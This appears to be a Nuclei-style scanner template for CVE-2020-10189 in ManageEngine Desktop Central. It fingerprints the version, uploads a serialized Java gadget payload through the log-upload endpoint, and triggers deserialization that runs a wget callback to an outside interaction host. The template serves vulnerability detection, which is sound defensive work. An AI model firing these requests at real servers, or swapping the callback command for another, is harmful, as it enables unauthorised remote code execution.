id: CVE-2020-10189

info:
  name: ManageEngine Desktop Central Java Deserialization
  author: king-alexander
  severity: critical
  remediation: Apply updates per vendor instructions.
  description: Zoho ManageEngine Desktop Central before 10.0.474 is vulnerable to a deserialization of untrusted data, which permits remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-10189
    - https://packetstormsecurity.com/files/156730/ManageEngine-Desktop-Central-Java-Deserialization.html
    - https://srcincite.io/pocs/src-2020-0011.py.txt
    - https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html
  tags: cve,cve2020,kev

http:
  # detect vulnerable version
  - method: GET
    path:
      - "https://{{Host}}:8383/configurations.do"

    extractors:
      - type: regex
        name: version
        internal: true
        group: 1
        regex:
          - "^([0-9.]+)?([0-9.]+)?([0-9]+)$"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "ManageEngine Desktop Central"

      - type: dsl
        dsl:
          - compare_versions(version, '<10.0.474')

  # arbitrary file write
  - method: POST
    headers:
      Content-Type: application/octet-stream
    path:
      # 'udid' is entirely attacker-controlled and 'logger.zip' is an allow-listed filename
      - "https://{{Host}}:8383/mdm/client/v1/mdmLogUploader?udid={{rand_int()}}&filename=logger.zip"
    # generate a serialized raw bytes payload
    body: '{{generate_java_gadget("commons-collections3.1","wget http://{{interactsh-url}}","raw")}}'

    matchers:
      - type: status
        status:
          - 200

  # deserialization
  - method: POST
    path:
      - "https://{Host}:8383/cewolf/{{File}}?img=\\logger.zip"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: interactsh_protocol
        words:
          - "http"
